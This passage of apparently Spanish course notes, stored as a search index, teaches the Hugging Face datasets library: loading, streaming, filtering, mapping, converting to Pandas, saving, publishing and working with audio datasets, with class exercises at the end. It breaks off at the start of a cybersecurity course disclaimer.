Pandas","text":"<p>Si estamos trabajando con Pandas y queremos cargar un archivo que est\u00e1 en un dataset de Hugging Face, podemos utilizar la librer\u00eda de <code>huggingface_hub</code> para crear, eliminar, actualizar y recuperar informaci\u00f3n de los repositorios.</p> <p>Por ejemplo, para cargar un dataset CSV con Pandas podr\u00edamos hacer:</p> <pre><code>from huggingface_hub import hf_hub_download\nimport pandas as pd\n\nREPO_ID = \"aitor-medrano/iabd\"\nFICHERO = \"cp_train.csv\"\n\ndataset = pd.read_csv(\n    hf_hub_download(repo_id=REPO_ID, filename=FICHERO, repo_type=\"dataset\")\n)\nprint(dataset)\n# &lt;class 'pandas.core.frame.DataFrame'&gt;\n# RangeIndex: 3214 entries, 0 to 3213\n# Data columns (total 3 columns):\n#  #   Column   Non-Null Count  Dtype  \n# ---  ------   --------------  -----  \n#  0   formula  3214 non-null   object \n#  1   T        3214 non-null   float64\n#  2   Cp       3214 non-null   float64\n# dtypes: float64(2), object(1)\n# memory usage: 75.5+ KB\n</code></pre>","tags":["HuggingFace"]},{"location":"Datasets/datasets_aitor/#cargando-en-streaming","title":"Cargando en streaming","text":"<p>Si el dataset ocupa varios gigas, con modelos como BERT o GPT, puede que no quepan en memoria RAM. Para ello, la librer\u00eda datasets gestiona los datos como ficheros mapeados en memoria realizando un streaming de los datos.</p> Streaming de un dataset - https://huggingface.co/docs/datasets/stream <p>Para este apartado, vamos a utilizar parte de un dataset con c\u00f3digo encontrado en GitHub de los diferentes lenguajes de programaci\u00f3n, conocido como BigCode.</p> <p>Gated dataset</p> <p>El dataset de BigCode est\u00e1 configurado para pedir las credenciales de los usuarios que los utilizan. Esto se conoce como un Gated dataset. Es por ello que tenemos que hacer login en Hugging Face antes de poder descargarlo.</p> <p>En nuestro caso, nos vamos a centrar en archivos <code>DockerFile</code> para que el dataset sea asumible (alrededor de 1Gb). As\u00ed pues, cargamos los datos:</p> <pre><code>from datasets import load_dataset\n\nbigcode_dataset = load_dataset(\"bigcode/the-stack-v2\", \"Dockerfile\", split=\"train\")\nprint(bigcode_dataset)\n# Dataset({\n#     features: ['blob_id', 'directory_id', 'path', 'content_id', 'detected_licenses', 'license_type', 'repo_name', 'snapshot_id', 'revision_id', 'branch_name', 'visit_date', 'revision_date', 'committer_date', 'github_id', 'star_events_count', 'fork_events_count', 'gha_license_id', 'gha_event_created_at', 'gha_created_at', 'gha_language', 'src_encoding', 'language', 'is_vendor', 'is_generated', 'length_bytes', 'extension'],\n#     num_rows: 4155925\n# })\n</code></pre> <p>Y el contenido de un documento:</p> <pre><code>{\n   \"blob_id\":\"a29dd2b33082d2b98541c66ba3620ae054991503\",\n   \"directory_id\":\"71568d223947f51cb007a8564e5f808e0987779e\",\n   \"path\":\"/src/Dapr/GameServer.Host/Dockerfile\",\n   \"content_id\":\"072b3138be512a71cf4e8bbbdb657497e808d2f6\",\n   \"detected_licenses\":[\n      \"MIT\",\n      \"LicenseRef-scancode-unknown-license-reference\"\n   ],\n   \"license_type\":\"permissive\",\n   \"repo_name\":\"devblack/OpenMU\",\n   \"snapshot_id\":\"8cdc521178da47c9c7d2daa502dc71688835fd0a\",\n   \"revision_id\":\"1064b0dca1a491bc28f325e42ca6b97d406d6558\",\n   \"branch_name\":\"refs/heads/master\",\n   \"visit_date\":Timestamp(\"2023-04-07 10:56:30.043316\"),\n   \"revision_date\":Timestamp(\"2023-03-17 20:32:25\"),\n   \"committer_date\":Timestamp(\"2023-03-17 20:32:25\"),\n   \"github_id\":None,\n   \"star_events_count\":0,\n   \"fork_events_count\":0,\n   \"gha_license_id\":None,\n   \"gha_event_created_at\":None,\n   \"gha_created_at\":None,\n   \"gha_language\":None,\n   \"src_encoding\":\"UTF-8\",\n   \"language\":\"Dockerfile\",\n   \"is_vendor\":false,\n   \"is_generated\":false,\n   \"length_bytes\":709,\n   \"extension\":\"\"\n}\n</code></pre> <p>Si ahora cargamos el dataset mediante streaming, pas\u00e1ndole el par\u00e1metros <code>streaming=True</code>, en vez de recuperar un Dataset, obtendremos un <code>IterableDataset</code>:</p> <pre><code>from datasets import load_dataset\n\nstreaming_dataset = load_dataset(\"bigcode/the-stack-v2\", \"Dockerfile\", split=\"train\", streaming=True)\nprint(streaming_dataset)\n# Resolving data files: 100%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 976/976 [00:00&lt;00:00, 1064.36it/s]\n# IterableDataset({\n#     features: ['blob_id', 'directory_id', 'path', 'content_id', 'detected_licenses', 'license_type', 'repo_name', 'snapshot_id', 'revision_id', 'branch_name', 'visit_date', 'revision_date', 'committer_date', 'github_id', 'star_events_count', 'fork_events_count', 'gha_license_id', 'gha_event_created_at', 'gha_created_at', 'gha_language', 'src_encoding', 'language', 'is_vendor', 'is_generated', 'length_bytes', 'extension'],\n#     n_shards: 1\n# })\n</code></pre> <p>Como sugiere el nombre, para acceder a los elementos del <code>IterableDataset</code> necesitamos iterar sobre \u00e9l:</p> <pre><code>print(next(iter(streaming_dataset)))\n</code></pre> <p>Los elementos de un dataset en streaming  se pueden procesar al vuelo mediante la funci\u00f3n <code>map</code> o <code>filter</code>. Por ejemplo, para pasar a may\u00fasculas el campo <code>license_type</code> har\u00edamos:</p> <pre><code>def mayusLicencias(registro):\n    registro[\"license_type\"] = registro[\"license_type\"].upper()\n    return registro\n\nmapped_dataset = streaming_dataset.map(mayusLicencias)\n\nprint(next(iter(streaming_dataset)))\n# ... 'detected_licenses': ['MIT', ...], 'license_type': 'PERMISSIVE', 'repo_name': 'devblack/OpenMU' ...\n</code></pre> <p>Al vuelo</p> <p>Debemos tener en cuenta que la transformaci\u00f3n se realizar\u00e1 al recorrer el dataset, no al invocar a los m\u00e9todos <code>map</code> o <code>filter</code>.</p> <p>Otras opciones son utilizar las operaciones <code>take()</code>, <code>shuffle()</code> o <code>skip()</code> dentro del <code>IterableDataset</code> para trabajar con muestras peque\u00f1as de los datos cargados:</p> <pre><code>muestra = streaming_dataset.take(100)\nmuestra_aleatoria = streaming_dataset.shuffle(seed=42, buffer_size=1000).take(500)\nrango = streaming_dataset.skip(1000).take(100)\n</code></pre> <p>M\u00e1s informaci\u00f3n en https://huggingface.co/docs/datasets/stream y https://huggingface.co/docs/datasets/about_mapstyle_vs_iterable.</p>","tags":["HuggingFace"]},{"location":"Datasets/datasets_aitor/#limpiando","title":"Limpiando","text":"<p>De forma similar a Pandas o Spark, podemos manipular el contenido de los objetos <code>Dataset</code>.</p> <p>El primer paso deber\u00eda ser barajar los datos para desordenarlos y coger una muestra. Para ello, emplearemos <code>Dataset.shuffle()</code>:</p> <pre><code>squad_train = squad_dataset_trainval[\"train\"]\nprint(squad_train[0][\"title\"]) # Beyonc\u00e9 Knowles\n\nsquad_train_shuffled = squad_train.shuffle(seed=333)\nprint(squad_train_shuffled[0][\"title\"]) # Carnaval\n</code></pre>","tags":["HuggingFace"]},{"location":"Datasets/datasets_aitor/#seleccionando-filas","title":"Seleccionando filas","text":"<p>Para recuperar filas, usaremos el m\u00e9todo <code>Dataset.select()</code> pas\u00e1ndole un iterador con las posiciones a seleccionar:</p> <pre><code>tres_filas = squad_train_shuffled.select([5,10,15])\nseis_filas = squad_train_shuffled.select(range(6))\n</code></pre> <p>Si queremos seleccionar las filas por alg\u00fan criterio espec\u00edfico, debemos emplear <code>Dataset.filter()</code> y funciones lambda:</p> <pre><code>empieza_por_b_filas = squad_train_shuffled.filter(lambda x: x[\"title\"].startswith(\"B\"))\nfor i in range(empieza_por_b_filas.num_rows):\n    print(empieza_por_b_filas[i][\"title\"])\n# Beidou _ Navigation _ Satellite _ System (en ingl\u00e9s)\n# Biodiversidad\n# Boston ...\n</code></pre>","tags":["HuggingFace"]},{"location":"Datasets/datasets_aitor/#trabajando-con-columnas","title":"Trabajando con columnas","text":"<p>Al trabajar con columnas, podemos a\u00f1adir una nueva mediante <code>Dataset.add_column()</code>, cambiarles el nombre con <code>DatasetDict.rename_column()</code> o eliminar una columna con <code>DatasetDict.remove_column()</code>:</p> <pre><code>nueva_columna = [\"nueva\"] * squad_train_shuffled.num_rows\nsquad_train_shuffled = squad_train_shuffled.add_column(name=\"inicial\",column=nueva_columna)\n# Dataset({\n#     features: ['title', 'paragraphs', 'inicial'],\n#     num_rows: 442\n# })\nsquad_train_shuffled = squad_train_shuffled.rename_column(\n    original_column_name=\"inicial\", new_column_name=\"modificada\"\n)\n# Dataset({\n#     features: ['title', 'paragraphs', 'modificada'],\n#     num_rows: 442\n# })\nsquad_train_shuffled = squad_train_shuffled.remove_columns([\"modificada\"])\n# Dataset({\n#     features: ['title', 'paragraphs'],\n#     num_rows: 442\n# })\n</code></pre>","tags":["HuggingFace"]},{"location":"Datasets/datasets_aitor/#trabajando-con-map","title":"Trabajando con map","text":"<p>Y la joya de la corona es la funci\u00f3n <code>Dataset.map()</code> para aplicar una transformaci\u00f3n a medida. Por ejemplo, si queremos modificar todos los t\u00edtulos y pasarlos a min\u00fascula haremos:</p> squad-map.py<pre><code>from datasets import load_dataset\n\nficheros_datos = {\"train\": \"train-v2.0-es.json\", \"test\": \"dev-v2.0-es.json\"}\nsquad_dataset = load_dataset(\"json\", data_files=ficheros_datos, field=\"data\")\nsquad_dataset = squad_dataset[\"train\"]\n\ndef titulo_minus(registro):\n    return {\"title\":registro[\"title\"].lower()}\n\nsquad_minus = squad_dataset.map(titulo_minus)\n\n# Mostramos 5 elementos\nprint(squad_minus.shuffle(seed=987)[\"title\"][:5])\n# ['marshall', 'ascensor', 'kanye', 'bbc televisi\u00f3n', 'florida']\n</code></pre> <p>Mediante la funci\u00f3n <code>map</code> tambi\u00e9n podemos crear nuevas columnas a partir de los valores de otras. Por ejemplo, a\u00f1adimos una nueva caracter\u00edstica con la cantidad de p\u00e1rrafos y quitamos toda la informaci\u00f3n existente previamente de los p\u00e1rrafos:</p> <pre><code># A\u00f1adimos nueva columna\nsquad_col_num_parrafos = squad_dataset.map(lambda x: {\"num_paragraphs\":len(x[\"paragraphs\"])})\n# Borramos la antigua\nsquad_col_num_parrafos = squad_col_num_parrafos.remove_columns(\"paragraphs\")\nprint(squad_col_num_parrafos.shuffle(seed=987)[:5])\n# {'title': ['Marshall', 'Ascensor', 'Kanye', 'BBC Televisi\u00f3n', 'Florida'], 'num_paragraphs': [51, 52, 79, 31, 35]}\n</code></pre> <p>\u00bfY si queremos ordenar los p\u00e1rrafos por la cantidad de p\u00e1rrafos? Para ello, podemos utilizar <code>Dataset.sort()</code>:</p> <pre><code>squad_num_parrafos_ordenados = squad_col_num_parrafos.sort(\"num_paragraphs\")\n\nprint(squad_num_parrafos_ordenados[:3]) # tres primeros\n# {'title': ['Tono _ (m\u00fasica)', 'Uva', 'Letra _ case'], 'num_paragraphs': [10, 10, 12]}\n\nprint(squad_num_parrafos_ordenados[-3:]) # tres \u00faltimos\n# {'title': ['American Idol (en ingl\u00e9s).', 'Nueva York', 'Budismo'], 'num_paragraphs': [127, 148, 149]}\n</code></pre>","tags":["HuggingFace"]},{"location":"Datasets/datasets_aitor/#trabajando-con-batches","title":"Trabajando con batches","text":"<p>El m\u00e9todo <code>Dataset.map()</code> admite el argumento <code>batched</code> que, si se establece en <code>True</code>, hace que env\u00ede un lote de datos a la funci\u00f3n <code>map</code> a la vez (el tama\u00f1o del lote es configurable mediante el par\u00e1metro <code>batch_size</code>, pero por defecto es de 1000). Al indicar <code>batched=True</code>, la funci\u00f3n <code>map</code> recibe un diccionario con los campos del conjunto de datos, pero cada valor es ahora una lista de valores, y no un \u00fanico valor, y del mismo modo, devuelve un diccionario con los campos que queremos actualizar o a\u00f1adir a nuestro conjunto de datos, y una lista de valores.</p> <p>Por ello, debemos modificar la funci\u00f3n que realiza el <code>map</code> para que trabaje con un diccionario de listas.</p> <p>Para el siguiente ejemplo, vamos a coger el dataset de SQuAD_es desde Hugging Face que contiene m\u00e1s datos, y vamos a comparar el tiempo de ejecuci\u00f3n, recodificando la funci\u00f3n para trabajar con un diccionario que contiene una lista por cada campo:</p> squad-map-batch.py<pre><code>from datasets import load_dataset\nimport time\n\n# Cargamos el dataset desde HF\nsquad_dataset = load_dataset(\"squad_es\", \"v2.0.0\", split=\"train\")  # (1)!\n\ndef titulo_minus(registro):\n    return {\"title\":registro[\"title\"].lower()}\n\ninicio = time.time()\nsquad_minus = squad_dataset.map(titulo_minus) # (2)!\n# Map: 100%|\u2588\u2588\u2588\u2588\u2588\u2588| 11858/11858 [00:00&lt;00:00, 37926.07 examples/s]   \nfin = time.time()\nprint(fin - inicio) # 3.008699893951416\n\ndef titulo_minus_batch(batch):\n    return {\"title\":[titulo.lower() for titulo in batch[\"title\"]]}\n\ninicio = time.time()\nsquad_minus = squad_dataset.map(titulo_minus_batch, batched=True) # (3)!\n# Map: 100%|\u2588\u2588\u2588\u2588\u2588\u2588| 11858/11858 [00:00&lt;00:00, 535210.67 examples/s]\nfin = time.time()\nprint(fin - inicio) # 0.19133710861206055\n</code></pre> <ol> <li>Cargamos los datos desde el dataset de Hugging Face</li> <li>El mapper normal realiza casi 40.000 registros por segundo</li> <li>Al hacerlo con batches realiza m\u00e1s de 500.000 por segundo</li> </ol>","tags":["HuggingFace"]},{"location":"Datasets/datasets_aitor/#uso-de-pandas","title":"Uso de Pandas","text":"<p>Para facilitar la conversi\u00f3n entre diferentes formados, podemos usar el m\u00e9todo <code>Dataset.set_format()</code> para modificar el formato de salida (por ejemplo, a <code>pandas</code>, <code>numpy</code>, <code>torch</code>, <code>tensorflow</code>, <code>jax</code>, ...), sin modificar el formato original del dataset (el cual es Apache Arrow - <code>arrow</code>).</p> <p>As\u00ed, si por ejemplo queremos pasar los datos a Pandas para trabajar con ellos, transformarlos o visualizarlos, podemos hacer:</p> <pre><code>print(squad_dataset[0])\nsquad_dataset.set_format(\"pandas\")\ndf = squad_dataset[:]\nprint(df.shape) # (130313, 5)\n\n# Otra forma\ndf2 = squad_dataset.to_pandas()\nprint(df2.info())\n# &lt;class 'pandas.core.frame.DataFrame'&gt;\n# RangeIndex: 130313 entries, 0 to 130312\n# Data columns (total 5 columns):\n#  #   Column    Non-Null Count   Dtype \n# ---  ------    --------------   ----- \n#  0   id        130313 non-null  object\n#  1   title     130313 non-null  object\n#  2   context   130313 non-null  object\n#  3   question  130313 non-null  object\n#  4   answers   130313 non-null  object\n# dtypes: object(5)\n# memory usage: 5.0+ MB\n\n# Y realizar consultas sobre los datos, por ejemplo, la 5 preguntas con m\u00e1s respuestas\nprint(df2.groupby(\"title\")[\"answers\"].count().nlargest(5))\n# title\n# Reina                         883\n# Nueva York                    817\n# American Idol (en ingl\u00e9s).    790\n# Beyonc\u00e9 Knowles               753\n# Universidad                   738\n</code></pre> <p>Y para volver a tener un objeto <code>Dataset</code>, podemos utilizar el m\u00e9todo <code>Dataset.from_pandas()</code> o resetear el dataset que ten\u00edamos mediante <code>Dataset.reset_format()</code>:</p> <pre><code>squad_transformed = Dataset.from_pandas(df)\nsquad_original = squad_dataset.reset_format()\n</code></pre>","tags":["HuggingFace"]},{"location":"Datasets/datasets_aitor/#creando-un-dataset-desde-cero","title":"Creando un dataset desde cero","text":"<p>Si en vez de cargar un dataset, tenemos que crear uno, el primer paso ser\u00e1 obtener los datos.</p> <p>Ya sea mediante peticiones a URL externas con la librer\u00eda <code>request</code>, accediendo a bases de datos relacionales, por ejemplo, mediante SQLAlchemy o a MongoDB mediante <code>PyMongo</code>, lo m\u00e1s normal es crear una estructura de datos mediante una lista o un diccionario y luego crear el dataset a partir del mismo.</p> <p>As\u00ed pues, si en vez de cargar un dataset queremos crear uno desde cero, podemos hacer uso de <code>Dataset.from_dict()</code> o <code>Dataset.from_list()</code> dependiendo de donde tengamos los datos. Por ejemplo, vamos a conectarnos a MongoDB y creamos una lista con todos los datos. A partir de la lista, generamos un Dataset:</p> dataset-mongodb.py<pre><code>from datasets import Dataset\nfrom pymongo import MongoClient\n\ncliente = MongoClient('mongodb+srv://iabd:iabdiabd@cluster0.dfaz5er.mongodb.net')\n\n# Vamos a trabajar con la colecci\u00f3n grades de sample_training\niabd_db = cliente.sample_training\ngrades_coll = iabd_db.grades\n\n# Creamos un dataset vac\u00edo mediante una lista\ndocumentos = []\n\n# Recuperamos todas las calificaciones\ncursor = grades_coll.find({})\nfor document in cursor:\n  del document[\"_id\"]  # Quitamos el ObjectId\n  documentos.append(document)\n\nmongo_dataset = Dataset.from_list(documentos)\nprint(mongo_dataset)\n# Dataset({\n#     features: ['student_id', 'scores', 'class_id'],\n#     num_rows: 100000\n# })\n</code></pre> <p>O si queremos almacenar los datos de forma temporal, por ejemplo, podemos hacer uso de Pandas:</p> <pre><code>df = pd.DataFrame.from_records(documentos)\ndf.to_json(\"grades-docs.jsonl\", orient=\"records\", lines=True)\njsonl_dataset = load_dataset(\"json\", data_files=\"grades-docs.jsonl\", split=\"train\")\n</code></pre>","tags":["HuggingFace"]},{"location":"Datasets/datasets_aitor/#persistiendo","title":"Persistiendo","text":"<p>Cuando cargamos un dataset se cachean los datos para evitar tener que descargar los datos de forma remota y crear las tablas de PyArrow. Podemos averiguar donde se almacenan los datos mediante la propiedad <code>cache_files</code>:</p> <pre><code>ficheros_datos = {\"train\": \"train-v2.0-es.json\", \"test\": \"dev-v2.0-es.json\"}\nsquad_dataset = load_dataset(\"json\", data_files=ficheros_datos, field=\"data\")\nprint(squad_dataset.cache_files)\n# {'train': [{'filename': '/Users/aitormedrano/.cache/huggingface/datasets/json/default-e3ff36a1d8fe78df/0.0.0/ab573428e7a11a7e23eebd41a2a71665ac3789ce311cbad7049572034a9bda05/json-train.arrow'}],\n#  'test': [{'filename': '/Users/aitormedrano/.cache/huggingface/datasets/json/default-e3ff36a1d8fe78df/0.0.0/ab573428e7a11a7e23eebd41a2a71665ac3789ce311cbad7049572034a9bda05/json-test.arrow'}]}\n</code></pre> <p>Si necesitamos persistir los datos de nuevo con las transformaciones realizadas, podemos hacerlo en diferentes formatos:</p> <ul> <li>Arrow: <code>Dataset.save_to_disk()</code></li> <li>CSV: <code>Dataset.to_csv()</code></li> <li>Pandas: <code>Dataset.to_pandas()</code></li> <li>JSON: <code>Dataset.to_json()</code></li> <li>Parquet: <code>Dataset.to_parquet()</code></li> </ul> <p>Si por ejemplo persistimos el dataset en Arrow:</p> <pre><code>squad_dataset.save_to_disk(\"squad_train_test\")\n</code></pre> <p>Se crear\u00e1 la siguiente estructura en las carpetas, donde para cada split se ha creado su propia carpeta, as\u00ed como un par de archivos con metadatos:</p> <pre><code>squad_train_test\n\u251c\u2500\u2500 dataset_dict.json\n\u251c\u2500\u2500 test\n\u2502   \u251c\u2500\u2500 data-00000-of-00001.arrow\n\u2502   \u251c\u2500\u2500 dataset_info.json\n\u2502   \u2514\u2500\u2500 state.json\n\u2514\u2500\u2500 train\n    \u251c\u2500\u2500 data-00000-of-00001.arrow\n    \u251c\u2500\u2500 dataset_info.json\n    \u2514\u2500\u2500 state.json\n</code></pre> <p>Una vez que hemos persistido el dataset, lo podemos volver a cargar mediante <code>load_from_disk</code>:</p> <pre><code>from datasets import load_from_disk\nsquad_disk = load_from_disk(\"squad_train_test\")\n</code></pre> <p>Si queremos persistirlos en formato CSV o JSON, por cada uno de los splits se crea un archivo separado. Para ello, podemos iterar sobre las claves mediante <code>DatasetDict.items()</code>:</p> <pre><code>for split, dataset in squad_dataset.items():\n    dataset.to_json(f\"squad_{split}.jsonl\")\n</code></pre>","tags":["HuggingFace"]},{"location":"Datasets/datasets_aitor/#publicando","title":"Publicando","text":"<p>Pues una vez hemos creado nuestro Dataset y lo hemos persistido en disco, el \u00fanico paso que nos queda es publicar en Hugging Face. Para ello, en vez de subir los archivos a mano como hicimos en la sesi\u00f3n inicial desde el interfaz web o hacer uso de Git y copiar los archivos, desde Python es mucho m\u00e1s c\u00f3modo.</p> <p>Previamente debemos realizar login para autenticarnos, tal como vimos en la secci\u00f3n de Login de la sesi\u00f3n anterior y usar nuestro token de acceso (en este caso, necesitamos que nuestro token sea de escritura):</p> <pre><code>hf auth login\n</code></pre> <p>Login desde un cuaderno Jupyter / Colab</p> <p>Si trabajamos con un cuaderno de Jupyter o Colab, podemos utilizar la librer\u00eda de huggingface_hub y al ejecutarlo, nos aparecer\u00e1 una ventana donde introducir el token de acceso:</p> <pre><code>from huggingface_hub import login\nlogin()\n</code></pre> <p> Login desde un notebook </p> <p>Tambi\u00e9n podemos hacer uso de la variable de entorno <code>HF_TOKEN</code> para almacenar el token de acceso, ya sea con un Space almacen\u00e1ndolo en un secret de Spaces o en claves privadas de Google Colab.</p> <p>Una vez autenticado, es tan sencillo como usar el m\u00e9todo <code>push_to_hub()</code> (si queremos publicar el dataset como privado, le a\u00f1adimos el par\u00e1metro <code>private=True</code>):</p> <pre><code>midataset.push_to_hub(\"aitor-medrano/midatasetpushed\")\n# midataset.push_to_hub(\"aitor-medrano/midatasetpushed\", private=True)\n</code></pre> <p>Si tuvi\u00e9ramos diferentes splits podr\u00edamos hacer:</p> <pre><code>train_dataset.push_to_hub(\"aitor-medrano/midatasetpushed\", split=\"train\")\nval_dataset.push_to_hub(\"aitor-medrano/midatasetpushed\", split=\"validation\")\n</code></pre> <p>Creando el dataset card</p> <p>Para crear el dataset card, podemos emplear la aplicaci\u00f3n https://huggingface.co/spaces/huggingface/datasets-tagging que facilita rellenar los campos e incluye recomendaciones de otros datasets.</p> <p>Tambi\u00e9n se recomienda leer la Dataset Card Creation Guide</p>","tags":["HuggingFace"]},{"location":"Datasets/datasets_aitor/#datasets-multimedia","title":"Datasets multimedia","text":"<p>Si nuestro dataset va a contener elementos multimedia con im\u00e1genes o audios, podemos subir los archivos en crudo, lo cual es lo m\u00e1s practico en la mayor\u00eda de los casos. Si los dataset de im\u00e1genes o audios son muy grandes, se recomienda el formato WebDataset, aunque lo m\u00e1s normal, es almacenar el dataset en formato Parquet.</p> <p>Dicho esto, vamos a ver como trabajar con datasets que contienen elementos multimedia.</p>","tags":["HuggingFace"]},{"location":"Datasets/datasets_aitor/#audios","title":"Audios","text":"<p>Para trabajar con audios, necesitaremos instalar las librer\u00edas de audio:</p> <pre><code>pip install datasets[audio]\n</code></pre> <p>Una vez instalado, vamos a cargar un dataset que contiene audios, como es PolyAI/minds14:</p> <pre><code>from datasets import load_dataset\n\nminds = load_dataset(\"PolyAI/minds14\", name=\"es-ES\", split=\"train\")\nprint(minds)\n# Dataset({\n#     features: ['path', 'audio', 'transcription', 'english_transcription', 'intent_class', 'lang_id'],\n#     num_rows: 486\n# })\n</code></pre> <p>El dataset contiene 486 archivos de audio, cada uno de los cuales va acompa\u00f1ado de una transcripci\u00f3n, una traducci\u00f3n al ingl\u00e9s y una etiqueta que indica la intenci\u00f3n de la consulta de la persona. La columna de audio contiene los datos de audio sin procesar. Veamos uno de los ejemplos:</p> <pre><code>{'path': '/home/jupyter-iabd/.cache/huggingface/datasets/downloads/extracted/a809f65b01ef0d5806ac705a72b9ca382622a5c03d9a17adf1ee73de4591650b/es-ES~APP_ERROR/60266571dc3604f481bcb50a.wav',\n 'audio': {'path': '/home/jupyter-iabd/.cache/huggingface/datasets/downloads/extracted/a809f65b01ef0d5806ac705a72b9ca382622a5c03d9a17adf1ee73de4591650b/es-ES~APP_ERROR/60266571dc3604f481bcb50a.wav',\n    'array': array([ 0.        ,  0.        ,  0.        , ...,  0.        ,\n            -0.00024414, -0.00024414]),\n    'sampling_rate': 8000\n },\n 'transcription': 'hola buenas a ver tengo un problema con vuestra aplicaci\u00f3n resulta que quiero hacer una transferencia bancaria a una cuenta conocida',\n 'english_transcription': 'hello good to see I have a problem with your application it turns out that I want to make a bank transfer to a known account',\n 'intent_class': 2,\n 'lang_id': 5}\n</code></pre> <p>Si nos centramos en el campo <code>audio</code>, vemos como contiene diferentes valores, los cuales forman parte de un objeto <code>Audio</code>:</p> <ul> <li><code>path</code>: ruta al archivo de audio (en este ejemplo <code>*.wav</code>).</li> <li><code>array</code>: los datos del audio decodificados, representados por un array de NumPy</li> <li><code>sampling_rate</code>: la frecuencia de muestreo (8,000 Hz).</li> </ul> <pre><code>ejemplo = minds.shuffle()[0]\n\nid2label = minds.features[\"intent_class\"].int2str\nlabel = id2label(ejemplo[\"intent_class\"])\n</code></pre> <p>Y si queremos escuchar el audio, usando Gradio podemos crear un componente:</p> <pre><code> with gr.Blocks() as demo:\n    with gr.Column():\n        gr.Audio(audio[\"path\"], label=label)\ndemo.launch(share=True)\n</code></pre> <p>Y reproducir el audio seleccionado:</p> Reproduciendo un audio desde Gradio <p>Finalmente, si queremos mostrar un gr\u00e1fico con el espectograma del audio, y haciendo uso de la librer\u00eda Librosa:</p> <pre><code>import librosa\nimport matplotlib.pyplot as plt\nimport librosa.display\n\narray = ejemplo[\"audio\"][\"array\"]\nsampling_rate = ejemplo[\"audio\"][\"sampling_rate\"]\n\nplt.figure().set_figwidth(12)\nlibrosa.display.waveshow(array, sr=sampling_rate)\n</code></pre> <p>Obteniendo:</p> Representaci\u00f3n gr\u00e1fica de un audio","tags":["HuggingFace"]},{"location":"Datasets/datasets_aitor/#creando-un-dataset-desde-python","title":"Creando un dataset desde Python","text":"<p>Si queremos crear un dataset a partir de audios propios, necesitamos crear un diccionario o una lista con la ruta a nuestros audios, y a continuaci\u00f3n, llamar al m\u00e9todo <code>cast_column</code> para transformar la columna a tipo <code>Audio</code> con las caracter\u00edsticas que hemos visto antes.</p> <p>As\u00ed pues, si tenemos los datos en un diccionario podemos hacer:</p> <pre><code>audio_dataset = Dataset.from_dict({\"audio\": [\"path/to/audio_1\", \"path/to/audio_2\", ..., \"path/to/audio_n\"]}).cast_column(\"audio\", Audio())\n</code></pre>","tags":["HuggingFace"]},{"location":"Datasets/datasets_aitor/#audiofolder","title":"Audiofolder","text":"<p>Otra posibilidad es crear el dataset a partir de una carpeta con todos los audios, y un archivo <code>metadata.csv</code> con los datos:</p> <pre><code>folder/train/metadata.csv\nfolder/train/first_audio_file.mp3\nfolder/train/second_audio_file.mp3\nfolder/train/third_audio_file.mp3\n</code></pre> <p>Y un archivo de metadatos con:</p> metadata.csv<pre><code>file_name,transcription\nfirst_audio_file.mp3,este es el texto del primer audio\nsecond_audio_file.mp3,en el segundo audio cuento un chiste\nthird_audio_file.mp3,y en este audio agradezco al p\u00fablico sus abucheos\n</code></pre> <p>Y a continuaci\u00f3n, indicamos como primer par\u00e1metro <code>autofolder</code> y con <code>data_dir</code> indicamos la carpeta que contiene los audios:</p> <pre><code>from datasets import load_dataset\n\ndataset = load_dataset(\"audiofolder\", data_dir=\"/path/to/folder\")\n</code></pre>","tags":["HuggingFace"]},{"location":"Datasets/datasets_aitor/#referencias","title":"Referencias","text":"<ul> <li>Documentaci\u00f3n oficial de dataset</li> <li>El cap\u00edtulo La librer\u00eda Dataset del curso NLP de Hugging Face.</li> </ul>","tags":["HuggingFace"]},{"location":"Datasets/datasets_aitor/#actividades","title":"Actividades","text":"<ol> <li> <p>(RAPIA.3 / CEPIA.3b, CEPIA.3c / 2.5p) Siguiendo el ejemplo inicial trabajado en la sesi\u00f3n y s\u00f3lo empleando Python:</p> <ol> <li>Descarga los datos de SquadES considerando que los datos remotos son los de entrenamiento y validaci\u00f3n.</li> <li>Con lo datos de entrenamiento, div\u00eddelos en entrenamiento y pruebas.</li> <li>Tras ello, sobre el dataset de entrenamiento, a\u00f1ade una columna a los datos de entrenamiento con la cantidad de p\u00e1rrafos.</li> <li>Filtra los datos de entrenamiento para que el dataset s\u00f3lo contenga aquellos registros que tienen m\u00e1s de 10 p\u00e1rrafos.</li> <li>Elimina la columna con la cantidad de p\u00e1rrafos.</li> <li>Persiste todo el dataset en formato Parquet.</li> <li>Finalmente, publ\u00edcalo en Hugging Face, editando la tarjeta y poniendo un documento de ejemplo en la documentaci\u00f3n.</li> </ol> </li> <li> <p>(RAPIA.3 / CEPIA.3b, CEPIA.3c / 0.5p) Carga en streaming el dataset de imagenet-1k, y muestra la etiqueta de los primeros 5 elementos.</p> </li> <li> <p>(RAPIA.3 / CEPIA.3b, CEPIA.3c / 1p) Tenemos un dataset con informaci\u00f3n sobre vuelos retrasados en Espa\u00f1a y otro con informaci\u00f3n general sobre los aeropuertos. Se pide:</p> <ol> <li>Une ambos datasets para que la informaci\u00f3n de los vuelos contengan el nombre y la ciudad de los aeropuertos.</li> <li>Persiste los datos (sin elementos repetidos) en un dataset en formato Arrow.</li> <li>Publ\u00edcalo en Hugging Face.</li> </ol> </li> <li> <p>(RAPIA.3 / CEPIA.3b, CEPIA.3c / opcional ) Sobre la base de datos de MongoDB de <code>sample_training</code> disponible en los datos de muestra de MongoAtlas:</p> <ol> <li>Carga los de estados de <code>states.js</code>.</li> <li>Realiza una join entre las colecciones <code>zips</code> y <code>states</code>.</li> <li>Persiste los datos (sin elementos repetidos) en un dataset en formato JSON.</li> <li>Publ\u00edcalo en Hugging Face.</li> </ol> </li> </ol>","tags":["HuggingFace"]},{"location":"Gestion_incidentes/","title":"Apuntes y ejercicios pr\u00e1cticas del curso de especializaci\u00f3n ciberseguridad","text":"<p>Los ejercicios y conocimientos contenidos en las pr\u00e1cticas y/o apuntes de  todos los m\u00f3dulos tienen exclusivamente prop\u00f3sito formativo, por lo que  nunca se deber\u00e1n utilizar con fines maliciosos o delictivos.</p> <p>Ning\u00fan alumno o alumna de este curso, ni profesor o profesora como  docentes, ser\u00e1n responsables de los da\u00f1os directos o indirectos que  pudieran derivarse del uso inadecuado de las herramientas y mecanismos  